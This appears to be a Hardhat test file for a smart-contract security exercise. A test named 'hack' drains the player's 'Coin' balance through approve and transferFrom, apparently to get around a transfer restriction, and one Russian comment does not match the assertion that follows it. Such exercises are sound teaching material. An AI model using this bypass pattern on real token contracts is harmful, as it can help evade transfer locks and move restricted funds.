const { expect } = require("chai");
const {
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");

describe("Coin", function () {
  async function deployFixture() {
    const [player] = await hre.ethers.getSigners();

    const Coin = await ethers.deployContract("Coin");
    await Coin.waitForDeployment();
    const CoinAddr = Coin.target;
    console.log("Адрес Coin токена:", CoinAddr);
    console.log("Ваш баланс:", await Coin.balanceOf(player));

    return { Coin, player };
  }

  it("hack", async function () {
    const { Coin, player } = await loadFixture(deployFixture);

    balance = await Coin.balanceOf(player);
    console.log("Current balance is: ", balance);

    await Coin.approve(player, balance);
    await Coin.transferFrom(player, Coin.getAddress(), balance);

    console.log("New balance is: ", await Coin.balanceOf(player));

    // баланс контракта прокси в токене HSE должен стать 0
    expect(await Coin.balanceOf(player)).to.equal(0);
  });
});
